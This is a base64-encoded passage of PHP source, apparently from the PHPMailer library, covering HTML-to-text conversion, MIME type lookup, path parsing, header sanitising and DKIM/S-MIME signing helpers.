Pm5vcm1hbGl6ZUJyZWFrcygkbWVzc2FnZSk7CiAgICAgICAgJHRoaXMtPkFsdEJvZHkgPSAkdGhpcy0+bm9ybWFsaXplQnJlYWtzKCR0aGlzLT5odG1sMnRleHQoJG1lc3NhZ2UsICRhZHZhbmNlZCkpOwogICAgICAgIGlmICghJHRoaXMtPmFsdGVybmF0aXZlRXhpc3RzKCkpIHsKICAgICAgICAgICAgJHRoaXMtPkFsdEJvZHkgPSAnVG8gdmlldyB0aGlzIGVtYWlsIG1lc3NhZ2UsIG9wZW4gaXQgaW4gYSBwcm9ncmFtIHRoYXQgdW5kZXJzdGFuZHMgSFRNTCEnIC4KICAgICAgICAgICAgICAgIHNlbGY6OkNSTEYgLiBzZWxmOjpDUkxGOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHRoaXMtPkJvZHk7CiAgICB9CgogICAgLyoqCiAgICAgKiBDb252ZXJ0IGFuIEhUTUwgc3RyaW5nIGludG8gcGxhaW4gdGV4dC4KICAgICAqIFRoaXMgaXMgdXNlZCBieSBtc2dIVE1MKCkuCiAgICAgKiBOb3RlIC0gb2xkZXIgdmVyc2lvbnMgb2YgdGhpcyBmdW5jdGlvbiB1c2VkIGEgYnVuZGxlZCBhZHZhbmNlZCBjb252ZXJ0ZXIKICAgICAqIHdoaWNoIHdhcyBiZWVuIHJlbW92ZWQgZm9yIGxpY2Vuc2UgcmVhc29ucyBpbiAjMjMyLgogICAgICogRXhhbXBsZSB1c2FnZToKICAgICAqIDxjb2RlPgogICAgICogLy8gVXNlIGRlZmF1bHQgY29udmVyc2lvbgogICAgICogJHBsYWluID0gJG1haWwtPmh0bWwydGV4dCgkaHRtbCk7CiAgICAgKiAvLyBVc2UgeW91ciBvd24gY3VzdG9tIGNvbnZlcnRlcgogICAgICogJHBsYWluID0gJG1haWwtPmh0bWwydGV4dCgkaHRtbCwgZnVuY3Rpb24oJGh0bWwpIHsKICAgICAqICAgICAkY29udmVydGVyID0gbmV3IE15SHRtbDJ0ZXh0KCRodG1sKTsKICAgICAqICAgICByZXR1cm4gJGNvbnZlcnRlci0+Z2V0X3RleHQoKTsKICAgICAqIH0pOwogICAgICogPC9jb2RlPgogICAgICogQHBhcmFtIHN0cmluZyAkaHRtbCBUaGUgSFRNTCB0ZXh0IHRvIGNvbnZlcnQKICAgICAqIEBwYXJhbSBib29sZWFufGNhbGxhYmxlICRhZHZhbmNlZCBBbnkgYm9vbGVhbiB2YWx1ZSB0byB1c2UgdGhlIGludGVybmFsIGNvbnZlcnRlciwKICAgICAqICAgb3IgcHJvdmlkZSB5b3VyIG93biBjYWxsYWJsZSBmb3IgY3VzdG9tIGNvbnZlcnNpb24uCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gaHRtbDJ0ZXh0KCRodG1sLCAkYWR2YW5jZWQgPSBmYWxzZSkKICAgIHsKICAgICAgICBpZiAoaXNfY2FsbGFibGUoJGFkdmFuY2VkKSkgewogICAgICAgICAgICByZXR1cm4gY2FsbF91c2VyX2Z1bmMoJGFkdmFuY2VkLCAkaHRtbCk7CiAgICAgICAgfQogICAgICAgIHJldHVybiBodG1sX2VudGl0eV9kZWNvZGUoCiAgICAgICAgICAgIHRyaW0oc3RyaXBfdGFncyhwcmVnX3JlcGxhY2UoJy88KGhlYWR8dGl0bGV8c3R5bGV8c2NyaXB0KVtePl0qPi4qPzxcL1xcMT4vc2knLCAnJywgJGh0bWwpKSksCiAgICAgICAgICAgIEVOVF9RVU9URVMsCiAgICAgICAgICAgICR0aGlzLT5DaGFyU2V0CiAgICAgICAgKTsKICAgIH0KCiAgICAvKioKICAgICAqIEdldCB0aGUgTUlNRSB0eXBlIGZvciBhIGZpbGUgZXh0ZW5zaW9uLgogICAgICogQHBhcmFtIHN0cmluZyAkZXh0IEZpbGUgZXh0ZW5zaW9uCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcgTUlNRSB0eXBlIG9mIGZpbGUuCiAgICAgKiBAc3RhdGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gX21pbWVfdHlwZXMoJGV4dCA9ICcnKQogICAgewogICAgICAgICRtaW1lcyA9IGFycmF5KAogICAgICAgICAgICAneGwnICAgID0+ICdhcHBsaWNhdGlvbi9leGNlbCcsCiAgICAgICAgICAgICdqcycgICAgPT4gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnLAogICAgICAgICAgICAnaHF4JyAgID0+ICdhcHBsaWNhdGlvbi9tYWMtYmluaGV4NDAnLAogICAgICAgICAgICAnY3B0JyAgID0+ICdhcHBsaWNhdGlvbi9tYWMtY29tcGFjdHBybycsCiAgICAgICAgICAgICdiaW4nICAgPT4gJ2FwcGxpY2F0aW9uL21hY2JpbmFyeScsCiAgICAgICAgICAgICdkb2MnICAgPT4gJ2FwcGxpY2F0aW9uL21zd29yZCcsCiAgICAgICAgICAgICd3b3JkJyAgPT4gJ2FwcGxpY2F0aW9uL21zd29yZCcsCiAgICAgICAgICAgICd4bHN4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5zcHJlYWRzaGVldG1sLnNoZWV0JywKICAgICAgICAgICAgJ3hsdHgnICA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnNwcmVhZHNoZWV0bWwudGVtcGxhdGUnLAogICAgICAgICAgICAncG90eCcgID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwudGVtcGxhdGUnLAogICAgICAgICAgICAncHBzeCcgID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwuc2xpZGVzaG93JywKICAgICAgICAgICAgJ3BwdHgnICA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnByZXNlbnRhdGlvbm1sLnByZXNlbnRhdGlvbicsCiAgICAgICAgICAgICdzbGR4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC5zbGlkZScsCiAgICAgICAgICAgICdkb2N4JyAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC53b3JkcHJvY2Vzc2luZ21sLmRvY3VtZW50JywKICAgICAgICAgICAgJ2RvdHgnICA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LndvcmRwcm9jZXNzaW5nbWwudGVtcGxhdGUnLAogICAgICAgICAgICAneGxhbScgID0+ICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwuYWRkaW4ubWFjcm9FbmFibGVkLjEyJywKICAgICAgICAgICAgJ3hsc2InICA9PiAnYXBwbGljYXRpb24vdm5kLm1zLWV4Y2VsLnNoZWV0LmJpbmFyeS5tYWNyb0VuYWJsZWQuMTInLAogICAgICAgICAgICAnY2xhc3MnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnZGxsJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnZG1zJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnZXhlJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnbGhhJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnbHpoJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAncHNkJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnc2VhJyAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnc28nICAgID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLAogICAgICAgICAgICAnb2RhJyAgID0+ICdhcHBsaWNhdGlvbi9vZGEnLAogICAgICAgICAgICAncGRmJyAgID0+ICdhcHBsaWNhdGlvbi9wZGYnLAogICAgICAgICAgICAnYWknICAgID0+ICdhcHBsaWNhdGlvbi9wb3N0c2NyaXB0JywKICAgICAgICAgICAgJ2VwcycgICA9PiAnYXBwbGljYXRpb24vcG9zdHNjcmlwdCcsCiAgICAgICAgICAgICdwcycgICAgPT4gJ2FwcGxpY2F0aW9uL3Bvc3RzY3JpcHQnLAogICAgICAgICAgICAnc21pJyAgID0+ICdhcHBsaWNhdGlvbi9zbWlsJywKICAgICAgICAgICAgJ3NtaWwnICA9PiAnYXBwbGljYXRpb24vc21pbCcsCiAgICAgICAgICAgICdtaWYnICAgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5taWYnLAogICAgICAgICAgICAneGxzJyAgID0+ICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwnLAogICAgICAgICAgICAncHB0JyAgID0+ICdhcHBsaWNhdGlvbi92bmQubXMtcG93ZXJwb2ludCcsCiAgICAgICAgICAgICd3YnhtbCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC53YXAud2J4bWwnLAogICAgICAgICAgICAnd21sYycgID0+ICdhcHBsaWNhdGlvbi92bmQud2FwLndtbGMnLAogICAgICAgICAgICAnZGNyJyAgID0+ICdhcHBsaWNhdGlvbi94LWRpcmVjdG9yJywKICAgICAgICAgICAgJ2RpcicgICA9PiAnYXBwbGljYXRpb24veC1kaXJlY3RvcicsCiAgICAgICAgICAgICdkeHInICAgPT4gJ2FwcGxpY2F0aW9uL3gtZGlyZWN0b3InLAogICAgICAgICAgICAnZHZpJyAgID0+ICdhcHBsaWNhdGlvbi94LWR2aScsCiAgICAgICAgICAgICdndGFyJyAgPT4gJ2FwcGxpY2F0aW9uL3gtZ3RhcicsCiAgICAgICAgICAgICdwaHAzJyAgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywKICAgICAgICAgICAgJ3BocDQnICA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAnLAogICAgICAgICAgICAncGhwJyAgID0+ICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocCcsCiAgICAgICAgICAgICdwaHRtbCcgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywKICAgICAgICAgICAgJ3BocHMnICA9PiAnYXBwbGljYXRpb24veC1odHRwZC1waHAtc291cmNlJywKICAgICAgICAgICAgJ3N3ZicgICA9PiAnYXBwbGljYXRpb24veC1zaG9ja3dhdmUtZmxhc2gnLAogICAgICAgICAgICAnc2l0JyAgID0+ICdhcHBsaWNhdGlvbi94LXN0dWZmaXQnLAogICAgICAgICAgICAndGFyJyAgID0+ICdhcHBsaWNhdGlvbi94LXRhcicsCiAgICAgICAgICAgICd0Z3onICAgPT4gJ2FwcGxpY2F0aW9uL3gtdGFyJywKICAgICAgICAgICAgJ3hodCcgICA9PiAnYXBwbGljYXRpb24veGh0bWwreG1sJywKICAgICAgICAgICAgJ3hodG1sJyA9PiAnYXBwbGljYXRpb24veGh0bWwreG1sJywKICAgICAgICAgICAgJ3ppcCcgICA9PiAnYXBwbGljYXRpb24vemlwJywKICAgICAgICAgICAgJ21pZCcgICA9PiAnYXVkaW8vbWlkaScsCiAgICAgICAgICAgICdtaWRpJyAgPT4gJ2F1ZGlvL21pZGknLAogICAgICAgICAgICAnbXAyJyAgID0+ICdhdWRpby9tcGVnJywKICAgICAgICAgICAgJ21wMycgICA9PiAnYXVkaW8vbXBlZycsCiAgICAgICAgICAgICdtcGdhJyAgPT4gJ2F1ZGlvL21wZWcnLAogICAgICAgICAgICAnYWlmJyAgID0+ICdhdWRpby94LWFpZmYnLAogICAgICAgICAgICAnYWlmYycgID0+ICdhdWRpby94LWFpZmYnLAogICAgICAgICAgICAnYWlmZicgID0+ICdhdWRpby94LWFpZmYnLAogICAgICAgICAgICAncmFtJyAgID0+ICdhdWRpby94LXBuLXJlYWxhdWRpbycsCiAgICAgICAgICAgICdybScgICAgPT4gJ2F1ZGlvL3gtcG4tcmVhbGF1ZGlvJywKICAgICAgICAgICAgJ3JwbScgICA9PiAnYXVkaW8veC1wbi1yZWFsYXVkaW8tcGx1Z2luJywKICAgICAgICAgICAgJ3JhJyAgICA9PiAnYXVkaW8veC1yZWFsYXVkaW8nLAogICAgICAgICAgICAnd2F2JyAgID0+ICdhdWRpby94LXdhdicsCiAgICAgICAgICAgICdibXAnICAgPT4gJ2ltYWdlL2JtcCcsCiAgICAgICAgICAgICdnaWYnICAgPT4gJ2ltYWdlL2dpZicsCiAgICAgICAgICAgICdqcGVnJyAgPT4gJ2ltYWdlL2pwZWcnLAogICAgICAgICAgICAnanBlJyAgID0+ICdpbWFnZS9qcGVnJywKICAgICAgICAgICAgJ2pwZycgICA9PiAnaW1hZ2UvanBlZycsCiAgICAgICAgICAgICdwbmcnICAgPT4gJ2ltYWdlL3BuZycsCiAgICAgICAgICAgICd0aWZmJyAgPT4gJ2ltYWdlL3RpZmYnLAogICAgICAgICAgICAndGlmJyAgID0+ICdpbWFnZS90aWZmJywKICAgICAgICAgICAgJ2VtbCcgICA9PiAnbWVzc2FnZS9yZmM4MjInLAogICAgICAgICAgICAnY3NzJyAgID0+ICd0ZXh0L2NzcycsCiAgICAgICAgICAgICdodG1sJyAgPT4gJ3RleHQvaHRtbCcsCiAgICAgICAgICAgICdodG0nICAgPT4gJ3RleHQvaHRtbCcsCiAgICAgICAgICAgICdzaHRtbCcgPT4gJ3RleHQvaHRtbCcsCiAgICAgICAgICAgICdsb2cnICAgPT4gJ3RleHQvcGxhaW4nLAogICAgICAgICAgICAndGV4dCcgID0+ICd0ZXh0L3BsYWluJywKICAgICAgICAgICAgJ3R4dCcgICA9PiAndGV4dC9wbGFpbicsCiAgICAgICAgICAgICdydHgnICAgPT4gJ3RleHQvcmljaHRleHQnLAogICAgICAgICAgICAncnRmJyAgID0+ICd0ZXh0L3J0ZicsCiAgICAgICAgICAgICd2Y2YnICAgPT4gJ3RleHQvdmNhcmQnLAogICAgICAgICAgICAndmNhcmQnID0+ICd0ZXh0L3ZjYXJkJywKICAgICAgICAgICAgJ3htbCcgICA9PiAndGV4dC94bWwnLAogICAgICAgICAgICAneHNsJyAgID0+ICd0ZXh0L3htbCcsCiAgICAgICAgICAgICdtcGVnJyAgPT4gJ3ZpZGVvL21wZWcnLAogICAgICAgICAgICAnbXBlJyAgID0+ICd2aWRlby9tcGVnJywKICAgICAgICAgICAgJ21wZycgICA9PiAndmlkZW8vbXBlZycsCiAgICAgICAgICAgICdtb3YnICAgPT4gJ3ZpZGVvL3F1aWNrdGltZScsCiAgICAgICAgICAgICdxdCcgICAgPT4gJ3ZpZGVvL3F1aWNrdGltZScsCiAgICAgICAgICAgICdydicgICAgPT4gJ3ZpZGVvL3ZuZC5ybi1yZWFsdmlkZW8nLAogICAgICAgICAgICAnYXZpJyAgID0+ICd2aWRlby94LW1zdmlkZW8nLAogICAgICAgICAgICAnbW92aWUnID0+ICd2aWRlby94LXNnaS1tb3ZpZScKICAgICAgICApOwogICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKHN0cnRvbG93ZXIoJGV4dCksICRtaW1lcykpIHsKICAgICAgICAgICAgcmV0dXJuICRtaW1lc1tzdHJ0b2xvd2VyKCRleHQpXTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nOwogICAgfQoKICAgIC8qKgogICAgICogTWFwIGEgZmlsZSBuYW1lIHRvIGEgTUlNRSB0eXBlLgogICAgICogRGVmYXVsdHMgdG8gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsIGkuZS4uIGFyYml0cmFyeSBiaW5hcnkgZGF0YS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lIEEgZmlsZSBuYW1lIG9yIGZ1bGwgcGF0aCwgZG9lcyBub3QgbmVlZCB0byBleGlzdCBhcyBhIGZpbGUKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKiBAc3RhdGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gZmlsZW5hbWVUb1R5cGUoJGZpbGVuYW1lKQogICAgewogICAgICAgIC8vIEluIGNhc2UgdGhlIHBhdGggaXMgYSBVUkwsIHN0cmlwIGFueSBxdWVyeSBzdHJpbmcgYmVmb3JlIGdldHRpbmcgZXh0ZW5zaW9uCiAgICAgICAgJHFwb3MgPSBzdHJwb3MoJGZpbGVuYW1lLCAnPycpOwogICAgICAgIGlmIChmYWxzZSAhPT0gJHFwb3MpIHsKICAgICAgICAgICAgJGZpbGVuYW1lID0gc3Vic3RyKCRmaWxlbmFtZSwgMCwgJHFwb3MpOwogICAgICAgIH0KICAgICAgICAkcGF0aGluZm8gPSBzZWxmOjptYl9wYXRoaW5mbygkZmlsZW5hbWUpOwogICAgICAgIHJldHVybiBzZWxmOjpfbWltZV90eXBlcygkcGF0aGluZm9bJ2V4dGVuc2lvbiddKTsKICAgIH0KCiAgICAvKioKICAgICAqIE11bHRpLWJ5dGUtc2FmZSBwYXRoaW5mbyByZXBsYWNlbWVudC4KICAgICAqIERyb3AtaW4gcmVwbGFjZW1lbnQgZm9yIHBhdGhpbmZvKCksIGJ1dCBtdWx0aWJ5dGUtc2FmZSwgY3Jvc3MtcGxhdGZvcm0tc2FmZSwgb2xkLXZlcnNpb24tc2FmZS4KICAgICAqIFdvcmtzIHNpbWlsYXJseSB0byB0aGUgb25lIGluIFBIUCA+PSA1LjIuMAogICAgICogQGxpbmsgaHR0cDovL3d3dy5waHAubmV0L21hbnVhbC9lbi9mdW5jdGlvbi5wYXRoaW5mby5waHAjMTA3NDYxCiAgICAgKiBAcGFyYW0gc3RyaW5nICRwYXRoIEEgZmlsZW5hbWUgb3IgcGF0aCwgZG9lcyBub3QgbmVlZCB0byBleGlzdCBhcyBhIGZpbGUKICAgICAqIEBwYXJhbSBpbnRlZ2VyfHN0cmluZyAkb3B0aW9ucyBFaXRoZXIgYSBQQVRISU5GT18qIGNvbnN0YW50LAogICAgICogICAgICBvciBhIHN0cmluZyBuYW1lIHRvIHJldHVybiBvbmx5IHRoZSBzcGVjaWZpZWQgcGllY2UsIGFsbG93cyAnZmlsZW5hbWUnIHRvIHdvcmsgb24gUEhQIDwgNS4yCiAgICAgKiBAcmV0dXJuIHN0cmluZ3xhcnJheQogICAgICogQHN0YXRpYwogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIG1iX3BhdGhpbmZvKCRwYXRoLCAkb3B0aW9ucyA9IG51bGwpCiAgICB7CiAgICAgICAgJHJldCA9IGFycmF5KCdkaXJuYW1lJyA9PiAnJywgJ2Jhc2VuYW1lJyA9PiAnJywgJ2V4dGVuc2lvbicgPT4gJycsICdmaWxlbmFtZScgPT4gJycpOwogICAgICAgICRwYXRoaW5mbyA9IGFycmF5KCk7CiAgICAgICAgaWYgKHByZWdfbWF0Y2goJyVeKC4qPylbXFxcXC9dKigoW14vXFxcXF0qPykoXC4oW15cLlxcXFwvXSs/KXwpKVtcXFxcL1wuXSokJWltJywgJHBhdGgsICRwYXRoaW5mbykpIHsKICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMSwgJHBhdGhpbmZvKSkgewogICAgICAgICAgICAgICAgJHJldFsnZGlybmFtZSddID0gJHBhdGhpbmZvWzFdOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKDIsICRwYXRoaW5mbykpIHsKICAgICAgICAgICAgICAgICRyZXRbJ2Jhc2VuYW1lJ10gPSAkcGF0aGluZm9bMl07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoNSwgJHBhdGhpbmZvKSkgewogICAgICAgICAgICAgICAgJHJldFsnZXh0ZW5zaW9uJ10gPSAkcGF0aGluZm9bNV07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMywgJHBhdGhpbmZvKSkgewogICAgICAgICAgICAgICAgJHJldFsnZmlsZW5hbWUnXSA9ICRwYXRoaW5mb1szXTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBzd2l0Y2ggKCRvcHRpb25zKSB7CiAgICAgICAgICAgIGNhc2UgUEFUSElORk9fRElSTkFNRToKICAgICAgICAgICAgY2FzZSAnZGlybmFtZSc6CiAgICAgICAgICAgICAgICByZXR1cm4gJHJldFsnZGlybmFtZSddOwogICAgICAgICAgICBjYXNlIFBBVEhJTkZPX0JBU0VOQU1FOgogICAgICAgICAgICBjYXNlICdiYXNlbmFtZSc6CiAgICAgICAgICAgICAgICByZXR1cm4gJHJldFsnYmFzZW5hbWUnXTsKICAgICAgICAgICAgY2FzZSBQQVRISU5GT19FWFRFTlNJT046CiAgICAgICAgICAgIGNhc2UgJ2V4dGVuc2lvbic6CiAgICAgICAgICAgICAgICByZXR1cm4gJHJldFsnZXh0ZW5zaW9uJ107CiAgICAgICAgICAgIGNhc2UgUEFUSElORk9fRklMRU5BTUU6CiAgICAgICAgICAgIGNhc2UgJ2ZpbGVuYW1lJzoKICAgICAgICAgICAgICAgIHJldHVybiAkcmV0WydmaWxlbmFtZSddOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgcmV0dXJuICRyZXQ7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogU2V0IG9yIHJlc2V0IGluc3RhbmNlIHByb3BlcnRpZXMuCiAgICAgKiBZb3Ugc2hvdWxkIGF2b2lkIHRoaXMgZnVuY3Rpb24gLSBpdCdzIG1vcmUgdmVyYm9zZSwgbGVzcyBlZmZpY2llbnQsIG1vcmUgZXJyb3ItcHJvbmUgYW5kCiAgICAgKiBoYXJkZXIgdG8gZGVidWcgdGhhbiBzZXR0aW5nIHByb3BlcnRpZXMgZGlyZWN0bHkuCiAgICAgKiBVc2FnZSBFeGFtcGxlOgogICAgICogYCRtYWlsLT5zZXQoJ1NNVFBTZWN1cmUnLCAndGxzJyk7YAogICAgICogICBpcyB0aGUgc2FtZSBhczoKICAgICAqIGAkbWFpbC0+U01UUFNlY3VyZSA9ICd0bHMnO2AKICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRuYW1lIFRoZSBwcm9wZXJ0eSBuYW1lIHRvIHNldAogICAgICogQHBhcmFtIG1peGVkICR2YWx1ZSBUaGUgdmFsdWUgdG8gc2V0IHRoZSBwcm9wZXJ0eSB0bwogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKiBAVE9ETyBTaG91bGQgdGhpcyBub3QgYmUgdXNpbmcgdGhlIF9fc2V0KCkgbWFnaWMgZnVuY3Rpb24/CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXQoJG5hbWUsICR2YWx1ZSA9ICcnKQogICAgewogICAgICAgIGlmIChwcm9wZXJ0eV9leGlzdHMoJHRoaXMsICRuYW1lKSkgewogICAgICAgICAgICAkdGhpcy0+JG5hbWUgPSAkdmFsdWU7CiAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkdGhpcy0+bGFuZygndmFyaWFibGVfc2V0JykgLiAkbmFtZSk7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBTdHJpcCBuZXdsaW5lcyB0byBwcmV2ZW50IGhlYWRlciBpbmplY3Rpb24uCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkc3RyCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc2VjdXJlSGVhZGVyKCRzdHIpCiAgICB7CiAgICAgICAgcmV0dXJuIHRyaW0oc3RyX3JlcGxhY2UoYXJyYXkoIlxyIiwgIlxuIiksICcnLCAkc3RyKSk7CiAgICB9CgogICAgLyoqCiAgICAgKiBOb3JtYWxpemUgbGluZSBicmVha3MgaW4gYSBzdHJpbmcuCiAgICAgKiBDb252ZXJ0cyBVTklYIExGLCBNYWMgQ1IgYW5kIFdpbmRvd3MgQ1JMRiBsaW5lIGJyZWFrcyBpbnRvIGEgc2luZ2xlIGxpbmUgYnJlYWsgZm9ybWF0LgogICAgICogRGVmYXVsdHMgdG8gQ1JMRiAoZm9yIG1lc3NhZ2UgYm9kaWVzKSBhbmQgcHJlc2VydmVzIGNvbnNlY3V0aXZlIGJyZWFrcy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHRleHQKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJyZWFrdHlwZSBXaGF0IGtpbmQgb2YgbGluZSBicmVhayB0byB1c2UsIGRlZmF1bHRzIHRvIENSTEYKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHN0YXRpYwogICAgICovCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIG5vcm1hbGl6ZUJyZWFrcygkdGV4dCwgJGJyZWFrdHlwZSA9ICJcclxuIikKICAgIHsKICAgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFxyXG58XHJ8XG4pL21zJywgJGJyZWFrdHlwZSwgJHRleHQpOwogICAgfQoKICAgIC8qKgogICAgICogU2V0IHRoZSBwdWJsaWMgYW5kIHByaXZhdGUga2V5IGZpbGVzIGFuZCBwYXNzd29yZCBmb3IgUy9NSU1FIHNpZ25pbmcuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkY2VydF9maWxlbmFtZQogICAgICogQHBhcmFtIHN0cmluZyAka2V5X2ZpbGVuYW1lCiAgICAgKiBAcGFyYW0gc3RyaW5nICRrZXlfcGFzcyBQYXNzd29yZCBmb3IgcHJpdmF0ZSBrZXkKICAgICAqIEBwYXJhbSBzdHJpbmcgJGV4dHJhY2VydHNfZmlsZW5hbWUgT3B0aW9uYWwgcGF0aCB0byBjaGFpbiBjZXJ0aWZpY2F0ZQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc2lnbigkY2VydF9maWxlbmFtZSwgJGtleV9maWxlbmFtZSwgJGtleV9wYXNzLCAkZXh0cmFjZXJ0c19maWxlbmFtZSA9ICcnKQogICAgewogICAgICAgICR0aGlzLT5zaWduX2NlcnRfZmlsZSA9ICRjZXJ0X2ZpbGVuYW1lOwogICAgICAgICR0aGlzLT5zaWduX2tleV9maWxlID0gJGtleV9maWxlbmFtZTsKICAgICAgICAkdGhpcy0+c2lnbl9rZXlfcGFzcyA9ICRrZXlfcGFzczsKICAgICAgICAkdGhpcy0+c2lnbl9leHRyYWNlcnRzX2ZpbGUgPSAkZXh0cmFjZXJ0c19maWxlbmFtZTsKICAgIH0KCiAgICAvKioKICAgICAqIFF1b3RlZC1QcmludGFibGUtZW5jb2RlIGEgREtJTSBoZWFkZXIuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkdHh0CiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9RUCgkdHh0KQogICAgewogICAgICAgICRsaW5lID0gJyc7CiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgc3RybGVuKCR0eHQpOyAkaSsrKSB7CiAgICAgICAgICAgICRvcmQgPSBvcmQoJHR4dFskaV0pOwogICAgICAgICAgICBpZiAoKCgweDIxIDw9ICRvcmQpICYmICgkb3JkIDw9IDB4M0EpKSB8fCAkb3JkID09IDB4M0MgfHwgKCgweDNFIDw9ICRvcmQpICYmICgkb3JkIDw9IDB4N0UpKSkgewogICAgICAgICAgICAgICAgJGxpbmUgLj0gJHR4dFskaV07CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAkbGluZSAuPSAnPScgLiBzcHJpbnRmKCclMDJYJywgJG9yZCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuICRsaW5lOwogICAgfQoKICAgIC8qKgogICAgICogR2VuZXJhdGUgYSBES0lNIHNpZ25hdHVyZS4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzaWduSGVhZGVyCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQHJldHVybiBzdHJpbmcgVGhlIERLSU0gc2lnbmF0dXJlIHZhbHVlCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX1NpZ24oJHNpZ25IZWFkZXIpCiAgICB7CiAgICAgICAgaWYgKCFkZWZpbmVkKCdQS0NTN19URVhUJykpIHsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleHRlbnNpb25fbWlzc2